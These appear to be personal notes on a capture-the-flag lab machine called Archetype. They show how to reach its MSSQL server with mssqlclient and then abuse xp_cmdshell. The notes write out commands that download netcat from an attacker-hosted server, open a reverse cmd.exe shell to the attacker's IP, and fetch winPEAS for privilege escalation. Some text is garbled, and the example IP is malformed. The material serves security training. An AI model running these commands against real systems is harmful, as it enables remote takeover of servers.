> In order to connect to my mssqlclient you will have to use th![[Pasted image 20231007210022.png]]is command 

![[Pasted image 20231007210022.png]]

#ARCHETYPE is computer name/follow by the user/ip address of the target machine and at the end you will have to add #windows-auth. 

> In order to get the path of the mssqlclient you will have to run <locate mssqlclient> command without the symbols.


In order to download the file inside the server you will have to use this command using a python server 

 xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://ipadress of your machie/nc64.exe -outfile nc.exe

To get the reverseshell you will use this command 
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.0.0.0.12 443"

-remember to replace the ip and port that you are listening

In order to download winPEASS you will need to run this command
curl -LO https://github.com/carlospolop/PEASS-ng/releases/download/winPEAS-1.7.3/WinPEASx64.exe
